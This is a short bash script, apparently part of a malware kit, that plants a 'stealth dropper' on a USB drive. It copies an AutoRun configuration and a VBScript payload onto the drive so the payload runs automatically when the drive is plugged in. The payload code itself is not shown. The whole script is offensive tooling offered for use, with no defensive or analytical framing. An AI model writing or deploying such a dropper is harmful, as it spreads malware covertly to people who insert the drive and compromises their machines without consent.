#!/bin/bash
# Deploy refactored stealth dropper (OOP + SOLID, minimal, AutoRun only)

PENDRIVE="$1"
[ -d "$PENDRIVE" ] || {
	echo "[-] USB not found: $PENDRIVE"
	exit 1
}

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

cp "$SCRIPT_DIR/autorun_stealth.inf" "$PENDRIVE/autorun.inf"
cp "$SCRIPT_DIR/payload_refactored_final.vbs" "$PENDRIVE/payload.vbs"

echo "[+] Stealth dropper deployed to $PENDRIVE (AutoRun trigger)"
